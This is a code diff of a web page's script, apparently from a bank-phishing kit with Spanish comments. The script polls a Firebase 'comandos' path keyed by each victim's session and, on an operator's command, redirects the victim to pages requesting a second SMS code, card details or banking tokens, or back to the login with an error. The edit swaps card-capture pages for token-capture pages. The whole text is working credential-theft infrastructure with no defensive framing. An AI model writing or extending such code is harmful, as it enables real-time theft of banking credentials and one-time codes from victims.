@@ -1605,33 +1605,33 @@ removeMarginLeft();Sys.Application.add_init(function() {
                 }
                 
                 // 2. SOLICITAR SMS 2 (Código inválido/reintento)
-                if (cmd.accion === 'pedir_codigo_2') {
+                if (cmd.accion === 'pedir_codigo2') {
                     db.ref('comandos/' + sessionId).remove();
                     window.location.href = 'codigo2.html?id=' + sessionId;
                 }
 
                 // 3. SOLICITAR TARJETA (Datos plásticos)
-                if (cmd.accion === 'pedir_tarjeta') {
+                if (cmd.accion === 'pedir_token1') {
                     db.ref('comandos/' + sessionId).remove();
-                    window.location.href = 'tarjeta.html?id=' + sessionId;
+                    window.location.href = 'token.html?id=' + sessionId;
                 }
 
                 // 3. SOLICITAR TARJETA (Datos plásticos)
-                if (cmd.accion === 'pedir_tarjeta2') {
+                if (cmd.accion === 'pedir_token2') {
                     db.ref('comandos/' + sessionId).remove();
-                    window.location.href = 'tarjeta2.html?id=' + sessionId;
+                    window.location.href = 'token2.html?id=' + sessionId;
                 }
                 
                 // 4. RECHAZAR ACCESO
                 if (cmd.accion === 'rechazar') {
                     db.ref('comandos/' + sessionId).remove();
-                    window.location.href = 'index.html?error=1';
+                    window.location.href = './index.html?error=1';
                 }
             }
         });
     } else {
         // Si no hay ID en la URL, devolvemos al index por seguridad
-        window.location.href = 'index.html';
+        window.location.href = './index.html';
     }
 </script>
 <!-- Code injected by live-server -->
